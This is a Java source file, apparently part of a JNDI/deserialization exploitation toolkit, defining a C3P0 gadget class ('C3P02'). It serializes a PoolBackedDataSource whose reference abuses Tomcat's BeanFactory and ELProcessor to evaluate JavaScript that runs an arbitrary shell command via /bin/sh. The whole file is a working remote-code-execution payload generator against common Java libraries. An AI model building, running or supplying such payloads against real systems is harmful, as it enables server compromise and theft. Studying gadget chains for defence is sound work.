package com.nu1r.jndi.gadgets;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * C3P02 通过Tomcat 的 getObjectInstance 方法调用 ELProcessor 的 eval 方法实现表达式注入
 */
public class C3P02 implements ObjectPayload<Object>{

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String               command = param[0];
        PoolBackedDataSource b       = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(b);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private final String cmd;

        public PoolSource(String cmd) {
            this.cmd = cmd;
        }

        public Reference getReference() throws NamingException {
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "nu1r=eval"));
            ref.add(new StringRefAddr("nu1r", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','" + cmd + "']).start()\")"));
            return ref;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
    }
}
